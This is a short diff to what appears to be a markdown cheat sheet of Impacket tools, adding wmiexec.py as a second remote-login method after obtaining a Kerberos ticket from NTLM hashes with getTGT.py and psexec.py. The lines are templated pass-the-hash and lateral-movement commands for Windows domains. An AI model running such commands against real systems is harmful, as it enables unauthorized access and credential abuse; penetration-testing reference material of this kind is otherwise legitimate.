@@ -287,8 +287,10 @@ getTGT.py -hashes '<LMHASH:NTHASH>' <domain>/<user>
 export KRB5CCNAME=<username>@<domain>.ccache
 # showing Kerberos credentials cache
 klist
-# login
+# login method1
 python3 psexec.py -k -no-pass <target>
+# login method2
+wmiexec.py -k -no-pass <target>
 ```
 
 [reg.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/reg.py): remote registry manipulation tool through the ```MS-RRP``` [(Windows Remote Registry Protocol)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/0fa3191d-bb79-490a-81bd-54c2601b7a78)
